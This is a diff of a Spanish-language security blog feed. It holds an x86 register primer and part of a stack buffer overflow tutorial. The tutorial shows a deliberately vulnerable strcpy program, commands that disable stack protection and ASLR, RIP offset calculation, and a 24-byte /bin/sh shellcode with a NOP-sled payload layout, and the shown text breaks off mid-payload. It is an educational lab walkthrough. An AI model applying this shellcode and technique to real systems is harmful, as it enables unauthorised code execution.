+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;zf&lt;/strong&gt;: La bandera de zero, se establece cunado el resultado de una operacion es cero, y de lo contrario se borra&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;cf&lt;/strong&gt;: La bandera de acarreo, se establece cuando el resultado de una operacion es demasiado pequeño o demasiado grande para el operador de destino&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;sf&lt;/strong&gt;: La bandera de signo, se establece cuando el resultado de una operacion es negativo, si es positivo se borra&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;La neta hay un chingo de banderas asi que si quieres ver las demas, wachate esto: &lt;a href=&quot;http://www.c-jump.com/CIS77/ASM/Instructions/I77_0070_eflags_bits.htm&quot;&gt;Flags&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;registros-de-segmento&quot;&gt;Registros de segmento&lt;/h3&gt;
+
+&lt;p&gt;Ademas de todos los registros que dije, existen los registros de segmento, estos pueden ser usados en procesadores de 32 bits y 64 bits&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;cs: segmento de código, contiene la dirección inicial del segmento de código&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;ds: segmento de datos, contiene la dirección inicial del segmento de datos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;ss: segmento de pila, contiene la dirección inicial del segmento de pila&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;es: Segmento adicional&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tambien existen registros de segmento especiales, como lo son fs y gs, pero estos dos lo usa el sistema operativo para sus cosillas&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Cosillas extra&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Todos los registros a excepcion del EIP/RIP y las banderas, pueden ser usados por el compilador para convertir el codigo a lenguaje ensamblador&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Estos no son los unicos registros que puede usar el procesador, estos son solo los registros visibles para el programador y compilador, algunos registros no visibles pueden ser los Registros de control que son: cr0, cr1, cr2, cr3… Estos ayudan a implementar la paginacion de la memoria a nivel de hardware. Asi que si ves uno en accion, debiste de tener mucha suerte o saberle demasiado jsjs ^^&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;34-sintaxis-att-e-intel&quot;&gt;3.4. Sintaxis AT&amp;amp;T e Intel&lt;/h3&gt;
+
+&lt;p&gt;Hay dos sintaxis, AT&amp;amp;T e Intel&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;AT&amp;amp;T&lt;/strong&gt;:
+    &lt;ul&gt;
+      &lt;li&gt;Las intrucciones tienen formato “destino de la intruccion, origen”&lt;/li&gt;
+      &lt;li&gt;Ejemplo: movl $2, %eax&lt;/li&gt;
+      &lt;li&gt;Donde las constantes comienzan con $&lt;/li&gt;
+      &lt;li&gt;Y cada registro con %&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Intel&lt;/strong&gt;:&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;Esta seguramente es la vamos a ver en las practicas, y tienen el formato “destino, origen”&lt;/li&gt;
+      &lt;li&gt;Ejemplo: mov rax, rbx, lo que significa que movera el contenido de rbx a rax&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;35-tipos-de-datos&quot;&gt;3.5. Tipos de datos&lt;/h3&gt;
+
+&lt;p&gt;(en construccion, lo terminare mañana jeje)&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><summary type="html">Esta vez te enseñare la parte teorica de lo que considero debes de saber para empezar en el pwn</summary></entry><entry><title type="html">Explotanto un PRNG bad seed</title><link href="http://localhost:4000/prng-bad-seeds/" rel="alternate" type="text/html" title="Explotanto un PRNG bad seed" /><published>2022-12-20T00:00:00-06:00</published><updated>2022-12-20T00:00:00-06:00</updated><id>http://localhost:4000/prng-bad-seeds</id><content type="html" xml:base="http://localhost:4000/prng-bad-seeds/">&lt;p&gt;Puede ser que conozcas acerca de la generacion de numeros aleatorios, y en caso de que hayas programado en C algo que genere numeros aleatorios, talvez hayas usado la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand();&lt;/code&gt;, asi que hoy te voy a mostrar como aprovecharte de esa funcion y de lo que se conoce como una “bad seed” :relaxed:&lt;/p&gt;
 
 &lt;h2 id=&quot;que-es-una-seed&quot;&gt;¿Que es una seed?&lt;/h2&gt;
 
@@ -1547,315 +1974,4 @@ Cuando se sobreescribe el &lt;code class=&quot;language-plaintext highlighter-ro
 
 &lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/ret2libc/waifu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="ret2libc" /><category term="gdb" /><category term="bof" /><summary type="html">En este articulo veremos como realizar un ataque con una tecnica llamada ret2libc para hacer bypass del NX</summary></entry><entry><title type="html">BoF stack-based</title><link href="http://localhost:4000/bof-stack-based/" rel="alternate" type="text/html" title="BoF stack-based" /><published>2022-07-28T00:00:00-05:00</published><updated>2022-07-28T00:00:00-05:00</updated><id>http://localhost:4000/bof-stack-based</id><content type="html" xml:base="http://localhost:4000/bof-stack-based/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;¿Que es buffer overflow?.&lt;/li&gt;
-  &lt;li&gt;Layout del stack.&lt;/li&gt;
-  &lt;li&gt;Analisis el codigo fuente del binario&lt;/li&gt;
-  &lt;li&gt;Desbordando el buffer.&lt;/li&gt;
-  &lt;li&gt;Calculando el offset y tomando el control del RIP.&lt;/li&gt;
-  &lt;li&gt;Ejecutando la shellcode.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;que-es-buffer-overflow&quot;&gt;¿Que es buffer overflow?&lt;/h2&gt;
-
-&lt;p&gt;El buffer es un espacio en la memoria en el cual se almacenan datos de manera temporal mientras se transfieren de una ubicacion a otra. El buffer overflow ocurre cuando se supera el espacio que se le fue asignado al buffer, como resultado de esto el programa intenta escribir los datos en el buffer pero lo unico que ocasiona es que se sobreescriban otros registros de la memoria&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/buffer-overflow.png.webp&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En la imagen se puede observar una parte coloreada de azul en la cual se refiere al buffer de 8 bytes donde cada caracter de la palabra “password” es un byte, por otra parte se tiene una parte coloreada de color salmon/naranja en la cual tiene 2 caracteres (2 bytes) mas de los que puede almacenar el buffer, en la imagen esa parte tiene como nombre “overflow” ya que cuando se le ingresan esos 2 bytes de mas ya se estan saliendo de lo que puede almacenar el buffer y lo que ocurre es un buffer overflow&lt;/p&gt;
-
-&lt;p&gt;Imagen: &lt;a href=&quot;https://www.imperva.com/&quot;&gt;https://www.imperva.com/&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;layout-del-stack&quot;&gt;Layout del stack&lt;/h2&gt;
-
-&lt;p&gt;El layout del stack en un buffer overflow se estructura de la siguiente manera&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   high memory
-|---------------|
-|    funcion    |
-|---------------|
-|   parametros  |
-|---------------|
-|      RET      | --&amp;gt; Return adress/RIP: contiene la direccion de la siguiente instruccion a ejecutar
-|---------------|
-|      RBP      | --&amp;gt; Base pointer: Puntero base del stack frame actual
-|---------------|     
-|     buffer    |
-|---------------|
-|               |
-|---------------|
-    low memory
-
-RSP: Stack pointer, apunta a la parte superior del stack, RSP contiene la direccion del ultimo valor 
-que se metio en el stack
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;a-tomar-en-cuenta&quot;&gt;A tomar en cuenta&lt;/h3&gt;
-&lt;p&gt;Seguramente habras encontrado que los registros como el RBP y RSP pueden tener el nombre de EBP Y ESP, esto es por la arquitectura del sistema, a continuacion te muestro una tabla con los respectivos nombres de los registros en 32 y 64 bits&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;32 bits&lt;/th&gt;
-      &lt;th&gt;64 bits&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;EAX&lt;/td&gt;
-      &lt;td&gt;RAX&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;EBX&lt;/td&gt;
-      &lt;td&gt;RBX&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ECX&lt;/td&gt;
-      &lt;td&gt;RCX&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;EDX&lt;/td&gt;
-      &lt;td&gt;RDX&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ESP&lt;/td&gt;
-      &lt;td&gt;RSP&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;EBP&lt;/td&gt;
-      &lt;td&gt;RBP&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;EIP&lt;/td&gt;
-      &lt;td&gt;RIP&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;analisis-el-codigo-fuente-del-binario&quot;&gt;Analisis el codigo fuente del binario&lt;/h2&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
-#include&amp;lt;string.h&amp;gt;
-&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
-  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Input: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;En el siguiente codigo tenemos un buffer de 100 que se esta declarando como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char buf[100]&lt;/code&gt; , ademas se esta usando la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcpy&lt;/code&gt; la cual copia el contenido de una cadena a otra, en este caso copia lo que se escriba como argumento a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; , posteriormente con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; se imprime el contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; que seria lo que hayamos ingresado como argumento.&lt;/p&gt;
-
-&lt;p&gt;Antes de ejecutar el binario se debe de compilar de la siguiente manera esto para desactivar las protecciones y podamos ejecutar una shellcode:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; execstack vuln.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; vuln
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ahora podemos ver la ejecucion del binario de la siguiente manera:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/codigo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como se puede ver lo que se ingresa como argumento es lo que se imprime.&lt;/p&gt;
-
-&lt;h2 id=&quot;desbordando-el-buffer&quot;&gt;Desbordando el buffer&lt;/h2&gt;
-
-&lt;p&gt;Antes de comenzar con esta parte tenemos que desactivar la aleatoriedad de las direcciones (ASLR) con el siguiente comando:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;0 | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; /proc/sys/kernel/randomize_va_space
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Si quieres volver a activarlo solo cambia el 0 por un 2.&lt;/p&gt;
-
-&lt;p&gt;Ahora si pasaremos a ocasionar el buffer overflow, como sabemos que se esta declarando un buffer de 100, simplemente con unos caracteres de mas lograremos el buffer overflow, para esto usare python y con el siguiente comando generare 150 A.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;print ('A' * 150)&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ahora estos 150 caracteres son los que le pasaremos como argumento a nuestro binario.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/desborde.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y peto, vemos que nos arrojo un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segmentation fault (core dumped)&lt;/code&gt;, esto ocurre por que por dentro del binario se esta intentanto acceder a una direccion de la memoria que no es valida, entonces el flujo del programa se corrompe y no tiene mas opcion que petar.&lt;/p&gt;
-
-&lt;p&gt;Ahora pasaremos a ver que esta pasando por detras del binario y por que peta, para esto usare gdb con pwndbg, te dejo el repo de pwndbg en el cual vienen los pasos de la instalacion&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/pwndbg/pwndbg.git
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Para comenzar a debuggear el programa con gdb ingresamos este comando&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb -q ./vuln
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para poder ver lo que esta pasando por detras y ver por que nos arrojo el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segmentation fault (core dumped)&lt;/code&gt; primero tenemos que ejecutar el binario desde gdb pasandole 150 A con el siguiente comando:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r $(python2 -c &quot;print 'A'*150&quot;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Al ejecutarlo pasandole 150 A vemos que nos arroja esto:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/gdb-overflow.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Aqui podemos notar algo diferente a demas del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segmentation fault&lt;/code&gt;, abajo de eso vemos el siguiente mansaje &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0000555555555193 in main ()&lt;/code&gt;, esto nos quiere decir que en esa direccion del main() hay algo que es invalido&lt;/p&gt;
-
-&lt;p&gt;Bajando un poquito mas de lo que nos muestra el gdb vemos lo siguiente:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/ret.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;El RBP se ha sobreescrito por nuestra A&lt;/li&gt;
-  &lt;li&gt;El RSP que apunta a la parte superior del stack contiene una direccion con puras A&lt;/li&gt;
-  &lt;li&gt;Y el RET/RIP el cual apunta a la siguiente direccion a ejecutar tiene la direccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4141414141414141&lt;/code&gt; que en decimal es AAAAAAAA&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Y si mostramos el stack frame con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i f&lt;/code&gt; , vemos que nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;saved rip&lt;/code&gt; vale &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4141414141414141&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rip = 0x555555555193 in main; saved rip = 0x4141414141414141
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;entonces-por-que-peta&quot;&gt;¿Entonces por que peta?&lt;/h3&gt;
-
-&lt;p&gt;El programa peta por que cuando se sobreescribe el RIP/RET por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4141414141414141&lt;/code&gt; , ahora esta apuntando a esa direccion y esa direccion no es valida por que no hay nada que el programa pueda hacer, es por eso que el flujo del programa se corrompe y peta&lt;/p&gt;
-
-&lt;p&gt;Y el layout quedo de la siguiente manera&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Ʌ     high memory
-  |  |---------------|
-  |  |    funcion    |
-  |  |---------------|
-  |  |   parametros  |
-  |  |---------------|
-  |--| 414141414141  | --&amp;gt; RIP/RET: 0x4141414141414141
-  |  |---------------|
-  |--| 414141414141  | --&amp;gt; RBP: 0x4141414141414141
-  |  |---------------|     
-  |--| 414141414141  | --&amp;gt; Este es el buffer que se lleno de puras A
-     |---------------|
-     |               |
-     |---------------|
-        low memory
-
-Cuando se sobrepasa el tamaño del buffer nuestras A empiezan a subir a otros registros del stack 
-y a su vez los van sobreescribiendo
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;calculando-el-offset-y-tomando-el-control-del-rip&quot;&gt;Calculando el offset y tomando el control del RIP&lt;/h2&gt;
-
-&lt;p&gt;Ahora que ya sabemos que podemos sobreescribir el RIP lo que tenemos que hacer ahora es encontrar el offset del RIP, ya que esto no dice desde donde se empieza a sobreescribir.&lt;/p&gt;
-
-&lt;p&gt;Para esto usaremos una utilidad de metasploit que se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_create&lt;/code&gt; que nos permite generar una serie de caracteres para poder calcular los offset, el comando queda de la siguiente manera:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/metasploit/tools/exploit/pattern_create.rb -l 150&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;En mi caso lo ejecuto asi por que en esa ubicacion tengo la utilidad (se que pwndbg tiene un comando llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyclic&lt;/code&gt; para hacer lo mismo, solo que cuando lo uso me peta el pwndbg XD).&lt;/p&gt;
-
-&lt;p&gt;Ahora tenemos que correr el programa de esta forma con toda esta cadena que nos genero&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Si vemos nuestro RIP ahora tiene el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6541316541306541&lt;/code&gt;, esto son unos caracteres que se tomaron de la cadena que se genero.&lt;/p&gt;
-
-&lt;p&gt;Ahora con otra utilidad de metasploit llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_offset&lt;/code&gt; encontraremos el offset del RIP y el comando queda de la siguiente manera&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/metasploit/tools/exploit/pattern_offset.rb -q 0x6541316541306541
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahi lo tenemos, ahora ya sabemos el offset del RIP&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Exact match at offset 120
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Entonces si ahora que sabemos el offset el RIP podemos controlar a donde queremos apuntar, para saber que tenemos el control del RIP le diremos que el valor que contenga sean puras B, asi que ejecutaremos el programa de esta forma:&lt;/p&gt;
-
-&lt;p&gt;Lo que hara es meterle 120 A y como el offset el RIP es 120, las 8 B son con lo que vamos a sobreescribir el RIP&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r $(python2 -c &quot;print 'A'*120 + 'B' * 8&quot;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ahi lo tenemos, ahora nuestro RIP tiene el valor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4242424242424242&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/ret-control.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y bueno, ahora que ya podemos controlar el valor del RIP lo que vamos hacer es que el RIP apunte de una direccion arbitraria para para ejecutar una shellcode&lt;/p&gt;
-
-&lt;h2 id=&quot;ejecutando-la-shellcode&quot;&gt;Ejecutando la shellcode&lt;/h2&gt;
-
-&lt;h3 id=&quot;que-es-una-shellcode&quot;&gt;¿Que es una shellcode?&lt;/h3&gt;
-
-&lt;p&gt;Una shellcode son instrucciones de bajo nivel que son programadas en lenguaje ensamblador las cuales se inyectan en la memoria, estas intrucciones para poder ser inyectadas se deben de pasar a un string de bytes, la shellcode que usaremos es de 24 bytes y es esta&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Lo que hara es ejecutar /bin/sh, aqui les dejo el codigo en asm de esta misma shellcode&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
-  global _start
-    _start:
-      push rax
-      xor rdx, rdx
-      xor rsi, rsi
-      mov rbx,'/bin//sh'
-      push rbx
-      push rsp
-      pop rdi
-      mov al, 59
-      syscall
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tambien para poder usar una shellcode correctamente tenemos que hacer uso de los NOPs o NOP-slides&lt;/p&gt;
-
-&lt;p&gt;Lo que nos permiten los NOPs es deslizar el programa hacia un destino, se interpretan con el valor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\x90&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;ubicando-nuestra-shellcode-en-la-memoria&quot;&gt;Ubicando nuestra shellcode en la memoria&lt;/h3&gt;
-
-&lt;p&gt;El primer paso que haremos es ubicar nuestra shellcode en la memoria y lo haremos de la siguiente forma&lt;/p&gt;
-
-&lt;p&gt;Hay que recordar que tenemos un buffer de 100 que se esta declarando asi &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char buf[100]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;En estos 100 bytes tenemos que lograr ubicar nuestra shellcode de 24 bytes, asi que para eso restaremos 100 - 24 bytes de la shellcode y nos da 76, este 76 sera el junk que llenaremos de NOPs para llenar el buffer de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;100&lt;/code&gt;, los otros 24 bytes restantes son de la shellcode, hasta ahora nuestro payload va asi:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 76 bytes + 24 bytes = 100 bytes
-|---------|-----------|
-|  junk   | shellcode |
-|---------|-----------|
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tambien le sumaremos 20 NOPs que corresponden al padding, si hacemos una suma de lo que llevamos hasta ahora nos da 120 y nuestro payload va asi:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 76 bytes +  24 bytes + 20 bytes = 120 bytes
-|---------|-----------|---------|
-|  junk   | shellcode | padding |
-|---------|-----------|---------|
-
